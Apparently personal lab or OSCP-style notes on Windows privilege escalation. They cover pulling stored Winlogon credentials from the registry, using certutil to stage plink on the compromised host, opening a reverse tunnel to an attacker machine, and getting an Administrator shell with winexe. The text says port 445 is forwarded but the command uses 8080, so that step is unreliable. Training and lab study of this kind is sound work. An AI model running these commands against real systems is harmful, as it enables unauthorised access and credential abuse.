# Stored Passwords
Look here: 
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html<br>

## Reg query
- He executed<br>
![image](https://user-images.githubusercontent.com/64409788/190620030-47871a37-e6d5-44a9-8a22-eb8df78e13d6.png)
- Got a default password for winlogon, then executed a specific cmd for winlogon:
![image](https://user-images.githubusercontent.com/64409788/190620199-11ab90c4-1bed-440e-99c7-3b14b445719d.png)
- Finally got Deafult username too along with password.
- Now the box had smb open (port 445) but internally only
- Need to port forward inwards, using `plink`.

## Plink 
- Install ssh on your attacker linux machine.
- Move plink into the pwned machine using http.server and certutil.
- Forward internal port 445, to our linux machines port 445 via the shell:
```
plink.exe -l <linux-username> -pw <linux-passwd> <linux-ip> -R 8080:127.0.0.1:8080
```
Note: Here 8080 is the internal port to be forwarded.
- This gives a shell that is your linux pc (inside the win shell) Shell-Ception!!
- Use winexe to get admin win shell:
```
winexe -U Administrator%Password //127.0.0.1 "cmd.exe"
```
